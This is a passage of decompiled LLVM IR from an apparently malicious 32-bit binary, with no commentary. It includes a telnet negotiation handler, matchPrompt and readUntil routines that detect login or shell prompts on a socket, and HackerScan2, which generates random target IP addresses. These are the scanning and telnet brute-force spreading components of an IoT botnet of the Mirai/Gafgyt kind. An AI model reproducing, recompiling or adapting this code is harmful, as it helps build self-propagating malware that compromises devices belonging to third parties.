dec_label_pc_1000279c:                            ; preds = %dec_label_pc_10002790
  br label %dec_label_pc_100028e0

dec_label_pc_100027b8:                            ; preds = %dec_label_pc_10002790
  store i8 -1, i8* %stack_var_-56, align 1
  %v2_100027c4 = ptrtoint i8* %stack_var_-56 to i32
  store i32 268445656, i32* @lr, align 4
  %v4_100027d4 = call i32 @__libc_send(i32 %arg1, i32 %v2_100027c4, i32 1, i32 16384)
  %v2_100027e0 = load i8, i8* %v1_10002778, align 1
  %v3_100027e8 = icmp eq i8 %v2_100027e0, -4
  br i1 %v3_100027e8, label %dec_label_pc_100027f0, label %dec_label_pc_100027fc

dec_label_pc_100027f0:                            ; preds = %dec_label_pc_100027b8
  store i8 -2, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100028a4

dec_label_pc_100027fc:                            ; preds = %dec_label_pc_100027b8
  %v2_10002804 = load i8, i8* %v1_10002778, align 1
  %v3_1000280c = icmp eq i8 %v2_10002804, -2
  br i1 %v3_1000280c, label %dec_label_pc_10002814, label %dec_label_pc_10002820

dec_label_pc_10002814:                            ; preds = %dec_label_pc_100027fc
  store i8 -4, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100028a4

dec_label_pc_10002820:                            ; preds = %dec_label_pc_100027fc
  %v2_10002828 = load i8, i8* %v1_10002778, align 1
  %v3_10002830 = icmp eq i8 %v2_10002828, 3
  br i1 %v3_10002830, label %dec_label_pc_10002838, label %dec_label_pc_10002870

dec_label_pc_10002838:                            ; preds = %dec_label_pc_10002820
  store i8 -3, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100028a4

dec_label_pc_10002870:                            ; preds = %dec_label_pc_10002820
  %v3_10002848 = icmp eq i8 %v2_10002828, -3
  %.7 = select i1 %v3_10002848, i8 -4, i8 -2
  store i8 %.7, i8* %stack_var_-56, align 1
  br label %dec_label_pc_100028a4

dec_label_pc_100028a4:                            ; preds = %dec_label_pc_10002838, %dec_label_pc_10002814, %dec_label_pc_100027f0, %dec_label_pc_10002870
  store i32 268445884, i32* @lr, align 4
  %v4_100028b8 = call i32 @__libc_send(i32 %arg1, i32 %v2_100027c4, i32 1, i32 16384)
  %v1_100028c0 = add i32 %arg2, 2
  store i32 ptrtoint (i32* @global_var_100028d8.41 to i32), i32* @lr, align 4
  %v4_100028d4 = call i32 @__libc_send(i32 %arg1, i32 %v1_100028c0, i32 1, i32 16384)
  br label %dec_label_pc_100028e0

dec_label_pc_100028e0:                            ; preds = %dec_label_pc_1000279c, %dec_label_pc_100028a4, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-56, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder label %dec_label_pc_100028e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100028a4, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000292c = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_10016530.42 to i32), i32* @r3, align 4
  %v0_10002a6810 = call i32 @__GI_strlen()
  %v2_10002a7012 = icmp eq i32 %v0_10002a6810, 0
  br i1 %v2_10002a7012, label %dec_label_pc_10002a80, label %dec_label_pc_10002958.preheader.lr.ph

dec_label_pc_10002958.preheader.lr.ph:            ; preds = %entry
  %v2_10002974 = add i32 %v0_1000292c, %arg1
  br label %dec_label_pc_10002958.preheader

dec_label_pc_1000294c:                            ; preds = %dec_label_pc_100029e0, %dec_label_pc_100029b8, %dec_label_pc_10002990, %dec_label_pc_10002968
  %v1_10002950 = add nsw i32 %stack_var_-40.08, 1
  %v3_10002960 = icmp sgt i32 %v0_1000292c, %v1_10002950
  br i1 %v3_10002960, label %dec_label_pc_10002968, label %dec_label_pc_10002a08

dec_label_pc_10002968:                            ; preds = %dec_label_pc_10002958.preheader, %dec_label_pc_1000294c
  %stack_var_-40.08 = phi i32 [ %v1_10002950, %dec_label_pc_1000294c ], [ %stack_var_-40.115, %dec_label_pc_10002958.preheader ]
  %v2_1000297c = sub i32 %v2_10002974, %stack_var_-40.08
  %v1_10002980 = inttoptr i32 %v2_1000297c to i8*
  %v2_10002980 = load i8, i8* %v1_10002980, align 1
  %v3_10002988 = icmp eq i8 %v2_10002980, 0
  br i1 %v3_10002988, label %dec_label_pc_1000294c, label %dec_label_pc_10002990

dec_label_pc_10002990:                            ; preds = %dec_label_pc_10002968
  %v2_100029a8 = load i8, i8* %v1_10002980, align 1
  %v3_100029b0 = icmp eq i8 %v2_100029a8, 32
  br i1 %v3_100029b0, label %dec_label_pc_1000294c, label %dec_label_pc_100029b8

dec_label_pc_100029b8:                            ; preds = %dec_label_pc_10002990
  %v2_100029d0 = load i8, i8* %v1_10002980, align 1
  %v3_100029d8 = icmp eq i8 %v2_100029d0, 13
  br i1 %v3_100029d8, label %dec_label_pc_1000294c, label %dec_label_pc_100029e0

dec_label_pc_100029e0:                            ; preds = %dec_label_pc_100029b8
  %v2_100029f8 = load i8, i8* %v1_10002980, align 1
  %v3_10002a00 = icmp eq i8 %v2_100029f8, 10
  br i1 %v3_10002a00, label %dec_label_pc_1000294c, label %dec_label_pc_10002a08

dec_label_pc_10002a08:                            ; preds = %dec_label_pc_100029e0, %dec_label_pc_1000294c, %dec_label_pc_10002958.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_10002958.preheader ], [ %stack_var_-40.08, %dec_label_pc_100029e0 ], [ %v1_10002950, %dec_label_pc_1000294c ]
  %v2_10002a1c = sub i32 %v2_10002974, %stack_var_-40.0.lcssa
  %v1_10002a20 = inttoptr i32 %v2_10002a1c to i8*
  %v2_10002a20 = load i8, i8* %v1_10002a20, align 1
  %v2_10002a34 = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_10016530.42 to i32)
  %v1_10002a38 = inttoptr i32 %v2_10002a34 to i8*
  %v2_10002a38 = load i8, i8* %v1_10002a38, align 1
  %v4_10002a40 = icmp eq i8 %v2_10002a20, %v2_10002a38
  br i1 %v4_10002a40, label %dec_label_pc_10002a80, label %dec_label_pc_10002a54

dec_label_pc_10002a54:                            ; preds = %dec_label_pc_10002a08
  %v1_10002a58 = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_10016530.42 to i32), i32* @r3, align 4
  %v0_10002a68 = call i32 @__GI_strlen()
  %v2_10002a70 = icmp ult i32 %v1_10002a58, %v0_10002a68
  br i1 %v2_10002a70, label %dec_label_pc_10002958.preheader, label %dec_label_pc_10002a80

dec_label_pc_10002958.preheader:                  ; preds = %dec_label_pc_10002958.preheader.lr.ph, %dec_label_pc_10002a54
  %storemerge316 = phi i32 [ 0, %dec_label_pc_10002958.preheader.lr.ph ], [ %v1_10002a58, %dec_label_pc_10002a54 ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_10002958.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_10002a54 ]
  %v3_100029606 = icmp sgt i32 %v0_1000292c, %stack_var_-40.115
  br i1 %v3_100029606, label %dec_label_pc_10002968, label %dec_label_pc_10002a08

dec_label_pc_10002a80:                            ; preds = %entry, %dec_label_pc_10002a08, %dec_label_pc_10002a54
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_10002a08 ], [ 0, %dec_label_pc_10002a54 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_10002a58, { 1, 0 }
  uselistorder i32 %v0_1000292c, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_10016530.42 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002a80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10002958.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10002a08, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_10002ad4 = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_10002d145 = add i32 %v0_10002ad4, 2
  %v2_10002d1c6 = icmp slt i32 %v1_10002d145, %arg7
  br i1 %v2_10002d1c6, label %dec_label_pc_10002d24.lr.ph, label %dec_label_pc_10002d54

dec_label_pc_10002d24.lr.ph:                      ; preds = %entry
  %v2_10002b0c = ptrtoint i32* %stack_var_-192 to i32
  %v1_10002b54 = udiv i32 %arg1, 32
  %v1_10002b5c = mul nuw nsw i32 %v1_10002b54, 4
  %v2_10002b60 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10002b64 = add nuw nsw i32 %v1_10002b5c, 24
  %v1_10002b68 = add i32 %v2_10002b64, %v2_10002b60
  %v1_10002b6c = inttoptr i32 %v1_10002b68 to i32*
  %v1_10002b74 = urem i32 %arg1, 32
  %v3_10002b7c = shl i32 1, %v1_10002b74
  %v1_10002b9c = add i32 %arg1, 1
  %v2_10002ba4 = ptrtoint i32* %stack_var_-64 to i32
  %v4_10002cd4 = inttoptr i32 %arg2 to i8*
  %v3_10002ce8 = icmp eq i32 %arg3, 0
  %v2_10002d34 = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_10002d24

dec_label_pc_10002b0c:                            ; preds = %dec_label_pc_10002d30, %dec_label_pc_10002d24
  store i32 %v2_10002b0c, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge

dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge: ; preds = %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge.dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge_crit_edge, %dec_label_pc_10002b0c
  %v3_10002b24.pre = phi i32 [ %v2_10002b0c, %dec_label_pc_10002b0c ], [ %v3_10002b24.pre.pre, %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge.dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge_crit_edge ]
  %v1_10002b3c36 = phi i32 [ 1, %dec_label_pc_10002b0c ], [ %v1_10002b3c, %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge.dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge_crit_edge ]
  %v1_10002b28 = mul nuw nsw i32 %v1_10002b3c36, 4
  %v2_10002b2c = add i32 %v1_10002b28, %v3_10002b24.pre
  %v2_10002b34 = inttoptr i32 %v2_10002b2c to i32*
  store i32 0, i32* %v2_10002b34, align 4
  %v1_10002b3c = add nuw nsw i32 %v1_10002b3c36, 1
  %tmp33 = icmp ult i32 %v1_10002b3c, 32
  br i1 %tmp33, label %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge.dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge_crit_edge, label %dec_label_pc_10002b50

dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge.dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge_crit_edge: ; preds = %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge
  %v3_10002b24.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge

dec_label_pc_10002b50:                            ; preds = %dec_label_pc_10002b20.dec_label_pc_10002b20_crit_edge
  %v2_10002b6c = load i32, i32* %v1_10002b6c, align 4
  %v2_10002b80 = or i32 %v2_10002b6c, %v3_10002b7c
  store i32 %v2_10002b80, i32* %v1_10002b6c, align 4
  store i32 268446656, i32* @lr, align 4
  %v5_10002bbc = call i32 @__libc_select(i32 %v1_10002b9c, i32 %v2_10002b0c, i32 0, i32 0, i32 %v2_10002ba4)
  %tmp34 = icmp slt i32 %v5_10002bbc, 1
  br i1 %tmp34, label %dec_label_pc_10002d54, label %dec_label_pc_10002bcc

dec_label_pc_10002bcc:                            ; preds = %dec_label_pc_10002b50
  %v2_10002bd8 = add i32 %stack_var_-196.09, %arg6
  store i32 268446708, i32* @lr, align 4
  %v4_10002bf0 = call i32 @__libc_recv(i32 %arg1, i32 %v2_10002bd8, i32 1, i32 0)
  %v4_10002c04 = icmp eq i32 %v4_10002bf0, -1
  br i1 %v4_10002c04, label %dec_label_pc_10002c18, label %dec_label_pc_10002c0c

dec_label_pc_10002c0c:                            ; preds = %dec_label_pc_10002bcc
  %v3_10002c10 = icmp eq i32 %v4_10002bf0, 0
  br i1 %v3_10002c10, label %dec_label_pc_10002c18, label %dec_label_pc_10002c24

dec_label_pc_10002c18:                            ; preds = %dec_label_pc_10002c0c, %dec_label_pc_10002bcc
  br label %dec_label_pc_10002d5c

dec_label_pc_10002c24:                            ; preds = %dec_label_pc_10002c0c
  %v2_10002c2c = add i32 %v4_10002bf0, %stack_var_-196.09
  %v4_10002c34 = inttoptr i32 %v2_10002bd8 to i8*
  %v3_10002c38 = load i8, i8* %v4_10002c34, align 1
  %v3_10002c40 = icmp eq i8 %v3_10002c38, -1
  br i1 %v3_10002c40, label %dec_label_pc_10002c48, label %dec_label_pc_10002ccc

dec_label_pc_10002c48:                            ; preds = %dec_label_pc_10002c24
  %v1_10002c4c = add i32 %v2_10002bd8, 1
  store i32 268446820, i32* @lr, align 4
  %v4_10002c60 = call i32 @__libc_recv(i32 %arg1, i32 %v1_10002c4c, i32 2, i32 0)
  %v4_10002c74 = icmp eq i32 %v4_10002c60, -1
  br i1 %v4_10002c74, label %dec_label_pc_10002c88, label %dec_label_pc_10002c7c

dec_label_pc_10002c7c:                            ; preds = %dec_label_pc_10002c48
  %v3_10002c80 = icmp eq i32 %v4_10002c60, 0
  br i1 %v3_10002c80, label %dec_label_pc_10002c88, label %dec_label_pc_10002c94

dec_label_pc_10002c88:                            ; preds = %dec_label_pc_10002c7c, %dec_label_pc_10002c48
  br label %dec_label_pc_10002d5c

dec_label_pc_10002c94:                            ; preds = %dec_label_pc_10002c7c
  %v2_10002c9c = add i32 %v4_10002c60, %v2_10002c2c
  store i32 268446900, i32* @lr, align 4
  %v4_10002cb0 = call i32 @negotiate(i32 %arg1, i32 %v2_10002bd8, i32 3, i32 %v2_10002c2c)
  %v3_10002cb8 = icmp eq i32 %v4_10002cb0, 0
  br i1 %v3_10002cb8, label %dec_label_pc_10002cc0, label %dec_label_pc_10002d10.backedge

dec_label_pc_10002cc0:                            ; preds = %dec_label_pc_10002c94
  br label %dec_label_pc_10002d5c

dec_label_pc_10002ccc:                            ; preds = %dec_label_pc_10002c24
  store i32 268446936, i32* @lr, align 4
  %v5_10002cd4 = call i32 @strstr(i32 %arg6, i8* %v4_10002cd4, i32 %v2_10002bd8)
  %v3_10002cdc = icmp eq i32 %v5_10002cd4, 0
  br i1 %v3_10002cdc, label %dec_label_pc_10002ce4, label %dec_label_pc_10002d48

dec_label_pc_10002ce4:                            ; preds = %dec_label_pc_10002ccc
  br i1 %v3_10002ce8, label %dec_label_pc_10002d10.backedge, label %dec_label_pc_10002cf0

dec_label_pc_10002d10.backedge:                   ; preds = %dec_label_pc_10002ce4, %dec_label_pc_10002cf0, %dec_label_pc_10002c94
  %stack_var_-196.0.be = phi i32 [ %v2_10002c9c, %dec_label_pc_10002c94 ], [ %v2_10002c2c, %dec_label_pc_10002ce4 ], [ %v2_10002c2c, %dec_label_pc_10002cf0 ]
  %v1_10002d14 = add i32 %stack_var_-196.0.be, 2
  %v2_10002d1c = icmp slt i32 %v1_10002d14, %arg7
  br i1 %v2_10002d1c, label %dec_label_pc_10002d10.backedge.dec_label_pc_10002d24_crit_edge, label %dec_label_pc_10002d54

dec_label_pc_10002d10.backedge.dec_label_pc_10002d24_crit_edge: ; preds = %dec_label_pc_10002d10.backedge
  %v3_10002d24.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_10002d24

dec_label_pc_10002cf0:                            ; preds = %dec_label_pc_10002ce4
  %v1_10002cf4 = call i32 @matchPrompt(i32 %arg6)
  %v3_10002cfc = icmp eq i32 %v1_10002cf4, 0
  br i1 %v3_10002cfc, label %dec_label_pc_10002d10.backedge, label %dec_label_pc_10002d48

dec_label_pc_10002d24:                            ; preds = %dec_label_pc_10002d10.backedge.dec_label_pc_10002d24_crit_edge, %dec_label_pc_10002d24.lr.ph
  %v3_10002d24 = phi i32 [ %arg4, %dec_label_pc_10002d24.lr.ph ], [ %v3_10002d24.pre, %dec_label_pc_10002d10.backedge.dec_label_pc_10002d24_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_10002ad4, %dec_label_pc_10002d24.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_10002d10.backedge.dec_label_pc_10002d24_crit_edge ]
  %v2_10002d28 = icmp sgt i32 %v3_10002d24, 0
  br i1 %v2_10002d28, label %dec_label_pc_10002b0c, label %dec_label_pc_10002d30

dec_label_pc_10002d30:                            ; preds = %dec_label_pc_10002d24
  br i1 %v2_10002d34, label %dec_label_pc_10002b0c, label %dec_label_pc_10002d54

dec_label_pc_10002d48:                            ; preds = %dec_label_pc_10002ccc, %dec_label_pc_10002cf0
  br label %dec_label_pc_10002d5c

dec_label_pc_10002d54:                            ; preds = %dec_label_pc_10002d10.backedge, %dec_label_pc_10002d30, %dec_label_pc_10002b50, %entry
  br label %dec_label_pc_10002d5c

dec_label_pc_10002d5c:                            ; preds = %dec_label_pc_10002d48, %dec_label_pc_10002cc0, %dec_label_pc_10002c88, %dec_label_pc_10002c18, %dec_label_pc_10002d54
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_10002d54 ], [ 1, %dec_label_pc_10002d48 ], [ 0, %dec_label_pc_10002c18 ], [ 0, %dec_label_pc_10002c88 ], [ 0, %dec_label_pc_10002cc0 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_10002c2c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_10002b3c, { 1, 0 }
  uselistorder i32 %v2_10002b0c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_10002d5c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10002d54, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10002d48, { 1, 0 }
  uselistorder label %dec_label_pc_10002d10.backedge, { 1, 0, 2 }
}

define i32 @HackerScan2() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  store i8 0, i8* @global_var_1002c8f9.44, align 1
  store i8 0, i8* @global_var_1002c8fa.45, align 1
  store i8 0, i8* @global_var_1002c8fb.46, align 1
  store i8 0, i8* @global_var_1002c8fc.47, align 1
  store i32 268447188, i32* @lr, align 4
  %v0_10002dd0 = call i32 @random()
  %v2_10002df0 = srem i32 %v0_10002dd0, 255
  %v1_10002e18 = trunc i32 %v2_10002df0 to i8
  store i8 %v1_10002e18, i8* @global_var_1002c8f9.44, align 1
  store i32 268447264, i32* @lr, align 4
  %v0_10002e1c = call i32 @random()
  %v2_10002e3c = srem i32 %v0_10002e1c, 255
  %v1_10002e64 = trunc i32 %v2_10002e3c to i8
  store i8 %v1_10002e64, i8* @global_var_1002c8fa.45, align 1
  store i32 268447340, i32* @lr, align 4
  %v0_10002e68 = call i32 @random()
  %v2_10002e88 = srem i32 %v0_10002e68, 255
  %v1_10002eb0 = trunc i32 %v2_10002e88 to i8
  store i8 %v1_10002eb0, i8* @global_var_1002c8fb.46, align 1
  store i32 268447416, i32* @lr, align 4
  %v0_10002eb4 = call i32 @random()
  %v2_10002ed4 = srem i32 %v0_10002eb4, 255
  %v1_10002efc = trunc i32 %v2_10002ed4 to i8
  store i8 %v1_10002efc, i8* @global_var_1002c8fc.47, align 1
  store i32 268447492, i32* @lr, align 4
  %v0_10002f00 = call i32 @random()
  %v2_10002f1c = srem i32 %v0_10002f00, 208
  %v3_10002f30 = icmp eq i32 %v2_10002f1c, 0
  br i1 %v3_10002f30, label %dec_label_pc_10002f38, label %dec_label_pc_10002f80

dec_label_pc_10002f38:                            ; preds = %entry
  %v2_10002f38 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10002f4c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10002f4c = zext i8 %v3_10002f4c to i32
  %v4_10002f7c = call i32 @szprintf(i32 %v2_10002f38, i32 ptrtoint ([12 x i8]* @global_var_10016538.48 to i32), i32 %v4_10002f4c)
  br label %dec_label_pc_10002f80

dec_label_pc_10002f80:                            ; preds = %entry, %dec_label_pc_10002f38
  %v3_10002f84 = icmp eq i32 %v2_10002f1c, 1
  br i1 %v3_10002f84, label %dec_label_pc_10002f8c, label %dec_label_pc_10002fd4

dec_label_pc_10002f8c:                            ; preds = %dec_label_pc_10002f80
  %v2_10002f8c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10002fa0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10002fa0 = zext i8 %v3_10002fa0 to i32
  %v4_10002fd0 = call i32 @szprintf(i32 %v2_10002f8c, i32 ptrtoint ([14 x i8]* @global_var_10016544.49 to i32), i32 %v4_10002fa0)
  br label %dec_label_pc_10002fd4

dec_label_pc_10002fd4:                            ; preds = %dec_label_pc_10002f80, %dec_label_pc_10002f8c
  %v3_10002fd8 = icmp eq i32 %v2_10002f1c, 2
  br i1 %v3_10002fd8, label %dec_label_pc_10002fe0, label %dec_label_pc_10003028

dec_label_pc_10002fe0:                            ; preds = %dec_label_pc_10002fd4
  %v2_10002fe0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10002ff4 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10002ff4 = zext i8 %v3_10002ff4 to i32
  %v4_10003024 = call i32 @szprintf(i32 %v2_10002fe0, i32 ptrtoint ([11 x i8]* @global_var_10016554.50 to i32), i32 %v4_10002ff4)
  br label %dec_label_pc_10003028

dec_label_pc_10003028:                            ; preds = %dec_label_pc_10002fd4, %dec_label_pc_10002fe0
  %v3_1000302c = icmp eq i32 %v2_10002f1c, 3
  br i1 %v3_1000302c, label %dec_label_pc_10003034, label %dec_label_pc_1000307c

dec_label_pc_10003034:                            ; preds = %dec_label_pc_10003028
  %v2_10003034 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003048 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003048 = zext i8 %v3_10003048 to i32
  %v4_10003078 = call i32 @szprintf(i32 %v2_10003034, i32 ptrtoint ([13 x i8]* @global_var_10016560.51 to i32), i32 %v4_10003048)
  br label %dec_label_pc_1000307c

dec_label_pc_1000307c:                            ; preds = %dec_label_pc_10003028, %dec_label_pc_10003034
  %v3_10003080 = icmp eq i32 %v2_10002f1c, 4
  br i1 %v3_10003080, label %dec_label_pc_10003088, label %dec_label_pc_100030d0

dec_label_pc_10003088:                            ; preds = %dec_label_pc_1000307c
  %v2_10003088 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000309c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000309c = zext i8 %v3_1000309c to i32
  %v4_100030cc = call i32 @szprintf(i32 %v2_10003088, i32 ptrtoint ([11 x i8]* @global_var_10016570.52 to i32), i32 %v4_1000309c)
  br label %dec_label_pc_100030d0

dec_label_pc_100030d0:                            ; preds = %dec_label_pc_1000307c, %dec_label_pc_10003088
  %v3_100030d4 = icmp eq i32 %v2_10002f1c, 5
  br i1 %v3_100030d4, label %dec_label_pc_100030dc, label %dec_label_pc_10003124

dec_label_pc_100030dc:                            ; preds = %dec_label_pc_100030d0
  %v2_100030dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100030f0 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100030f0 = zext i8 %v3_100030f0 to i32
  %v4_10003120 = call i32 @szprintf(i32 %v2_100030dc, i32 ptrtoint ([13 x i8]* @global_var_1001657c.53 to i32), i32 %v4_100030f0)
  br label %dec_label_pc_10003124

dec_label_pc_10003124:                            ; preds = %dec_label_pc_100030d0, %dec_label_pc_100030dc
  %v3_10003128 = icmp eq i32 %v2_10002f1c, 6
  br i1 %v3_10003128, label %dec_label_pc_10003130, label %dec_label_pc_10003178

dec_label_pc_10003130:                            ; preds = %dec_label_pc_10003124
  %v2_10003130 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003144 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003144 = zext i8 %v3_10003144 to i32
  %v4_10003174 = call i32 @szprintf(i32 %v2_10003130, i32 ptrtoint ([12 x i8]* @global_var_1001658c.54 to i32), i32 %v4_10003144)
  br label %dec_label_pc_10003178

dec_label_pc_10003178:                            ; preds = %dec_label_pc_10003124, %dec_label_pc_10003130
  %v3_1000317c = icmp eq i32 %v2_10002f1c, 7
  br i1 %v3_1000317c, label %dec_label_pc_10003184, label %dec_label_pc_100031cc

dec_label_pc_10003184:                            ; preds = %dec_label_pc_10003178
  %v2_10003184 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003198 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003198 = zext i8 %v3_10003198 to i32
  %v4_100031c8 = call i32 @szprintf(i32 %v2_10003184, i32 ptrtoint ([13 x i8]* @global_var_10016598.55 to i32), i32 %v4_10003198)
  br label %dec_label_pc_100031cc

dec_label_pc_100031cc:                            ; preds = %dec_label_pc_10003178, %dec_label_pc_10003184
  %v3_100031d0 = icmp eq i32 %v2_10002f1c, 8
  br i1 %v3_100031d0, label %dec_label_pc_100031d8, label %dec_label_pc_10003220

dec_label_pc_100031d8:                            ; preds = %dec_label_pc_100031cc
  %v2_100031d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100031ec = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100031ec = zext i8 %v3_100031ec to i32
  %v4_1000321c = call i32 @szprintf(i32 %v2_100031d8, i32 ptrtoint ([13 x i8]* @global_var_100165a8.56 to i32), i32 %v4_100031ec)
  br label %dec_label_pc_10003220

dec_label_pc_10003220:                            ; preds = %dec_label_pc_100031cc, %dec_label_pc_100031d8
  %v3_10003224 = icmp eq i32 %v2_10002f1c, 9
  br i1 %v3_10003224, label %dec_label_pc_1000322c, label %dec_label_pc_10003274

dec_label_pc_1000322c:                            ; preds = %dec_label_pc_10003220
  %v2_1000322c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003240 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003240 = zext i8 %v3_10003240 to i32
  %v4_10003270 = call i32 @szprintf(i32 %v2_1000322c, i32 ptrtoint ([13 x i8]* @global_var_100165b8.57 to i32), i32 %v4_10003240)
  br label %dec_label_pc_10003274

dec_label_pc_10003274:                            ; preds = %dec_label_pc_10003220, %dec_label_pc_1000322c
  %v3_10003278 = icmp eq i32 %v2_10002f1c, 10
  br i1 %v3_10003278, label %dec_label_pc_10003280, label %dec_label_pc_100032c8

dec_label_pc_10003280:                            ; preds = %dec_label_pc_10003274
  %v2_10003280 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003294 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003294 = zext i8 %v3_10003294 to i32
  %v4_100032c4 = call i32 @szprintf(i32 %v2_10003280, i32 ptrtoint ([14 x i8]* @global_var_100165c8.58 to i32), i32 %v4_10003294)
  br label %dec_label_pc_100032c8

dec_label_pc_100032c8:                            ; preds = %dec_label_pc_10003274, %dec_label_pc_10003280
  %v3_100032cc = icmp eq i32 %v2_10002f1c, 11
  br i1 %v3_100032cc, label %dec_label_pc_100032d4, label %dec_label_pc_1000331c

dec_label_pc_100032d4:                            ; preds = %dec_label_pc_100032c8
  %v2_100032d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100032e8 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_100032e8 = zext i8 %v3_100032e8 to i32
  %v4_10003318 = call i32 @szprintf(i32 %v2_100032d4, i32 ptrtoint ([11 x i8]* @global_var_100165d8.59 to i32), i32 %v4_100032e8)
  br label %dec_label_pc_1000331c

dec_label_pc_1000331c:                            ; preds = %dec_label_pc_100032c8, %dec_label_pc_100032d4
  %v3_10003320 = icmp eq i32 %v2_10002f1c, 12
  br i1 %v3_10003320, label %dec_label_pc_10003328, label %dec_label_pc_10003370

dec_label_pc_10003328:                            ; preds = %dec_label_pc_1000331c
  %v2_10003328 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000333c = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_1000333c = zext i8 %v3_1000333c to i32
  %v4_1000336c = call i32 @szprintf(i32 %v2_10003328, i32 ptrtoint ([13 x i8]* @global_var_100165e4.60 to i32), i32 %v4_1000333c)
  br label %dec_label_pc_10003370

dec_label_pc_10003370:                            ; preds = %dec_label_pc_1000331c, %dec_label_pc_10003328
  %v3_10003374 = icmp eq i32 %v2_10002f1c, 13
  br i1 %v3_10003374, label %dec_label_pc_1000337c, label %dec_label_pc_100033c4

dec_label_pc_1000337c:                            ; preds = %dec_label_pc_10003370
  %v2_1000337c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10003390 = load i8, i8* @global_var_1002c8fb.46, align 1
  %v4_10003390 = zext i8 %v3_10003390 to i32
  %v4_100033c0 = call i32 @szprintf(i32 %v2_1000337c, i32 ptrtoint ([13 x i8]* @global_var_100165f4.61 to i32), i32 %v4_10003390)
